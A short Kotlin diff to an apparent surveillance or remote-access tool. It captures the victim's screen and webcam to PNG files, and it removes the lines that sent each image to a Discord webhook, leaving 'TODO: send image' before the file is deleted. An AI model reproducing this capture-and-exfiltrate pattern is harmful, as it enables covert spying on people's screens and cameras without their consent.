@@ -11,10 +11,7 @@ object Screen {
         val image = Robot().createScreenCapture(Rectangle(Toolkit.getDefaultToolkit().screenSize))
         ImageIO.write(image, "png", file)
 
-        Discord.webhook().apply {
-            attachments.add(file)
-            execute()
-        }
+        // TODO: send image
 
         file.delete()
     }
@@ -26,10 +23,7 @@ object Screen {
         if (!cam.isOpen) cam.open()
         ImageIO.write(cam.image, "png", file)
         cam.close()
-        Discord.webhook().apply {
-            attachments.add(file)
-            execute()
-        }
+        // TODO: send image
         file.delete()
     }
 }
